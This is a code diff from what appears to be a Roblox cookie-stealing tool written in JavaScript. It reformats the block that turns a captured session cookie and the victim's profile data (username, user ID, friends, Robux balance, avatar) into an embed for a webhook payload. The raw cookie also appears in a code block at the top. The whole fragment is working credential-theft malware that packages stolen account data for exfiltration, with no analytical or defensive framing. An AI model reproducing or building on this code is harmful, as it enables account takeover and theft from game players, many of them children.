@@ -157,55 +157,55 @@ ${cookie}
 \`\`\`
 `;
 
-    /* ================= EMBED FIELDS ================= */
+/* ================= EMBED FIELDS ================= */
 
-    const embedFields = [];
+const embedFields = [];
 
-    if (userInfo) {
-        embedFields.push(
-            {
-                name: "👤 Roblox Profile",
-                value:
-                    `**Username:** ${userInfo.username}\n` +
-                    `**Display Name:** ${userInfo.displayName}\n` +
-                    `**User ID:** ${userInfo.userId}\n` +
-                    `**Join Date:** ${userInfo.joinDate}\n` +
-                    `[View Profile](${userInfo.profileUrl})`,
-                inline: false
-            },
-            {
-                name: "👥 Friends",
-                value: `${userInfo.friendsCount}`,
-                inline: true
-            },
-            {
-                name: "💰 Robux",
-                value: `${robux} R$`,
-                inline: true
-            },
-            {
-                name: "👕 Wearing",
-                value: userInfo.wearing || "Unknown",
-                inline: false
-            }
-        );
-    } else {
-        embedFields.push({
-            name: "⚠️ Error",
+if (userInfo) {
+    embedFields.push(
+        {
+            name: "👤 Roblox Profile",
             value:
-                "Could not fetch public profile information.\n" +
-                "User may be deleted, banned, or invalid.",
+                `**Username:** ${userInfo.username}\n` +
+                `**Display Name:** ${userInfo.displayName}\n` +
+                `**User ID:** ${userInfo.userId}\n` +
+                `**Join Date:** ${userInfo.joinDate}\n\n` +
+                `🔗 [Profile](https://www.roblox.com/users/${rbxuid}/profile)`,
             inline: false
-        });
-    }
-
+        },
+        {
+            name: "👥 Friends",
+            value: `${userInfo.friendsCount}`,
+            inline: true
+        },
+        {
+            name: "💰 Robux",
+            value: `${robux} R$`,
+            inline: true
+        },
+        {
+            name: "👕 Wearing",
+            value: userInfo.wearing || "Unknown",
+            inline: false
+        }
+    );
+} else {
     embedFields.push({
-        name: "🔐 Cookie Summary",
+        name: "⚠️ Error",
         value:
-            `**Length:** ${cookie.length} characters\n` +
-            `**rbxuid:** ${rbxuid}`,
+            "Could not fetch public profile information.\n" +
+            "User may be deleted, banned, or invalid.",
         inline: false
     });
+}
+
+embedFields.push({
+    name: "🔐 Cookie Summary",
+    value:
+        `**Length:** ${cookie.length} characters\n` +
+        `**rbxuid:** ${rbxuid}`,
+    inline: false
+});
 
     /* ================= WEBHOOK PAYLOAD ================= */
 
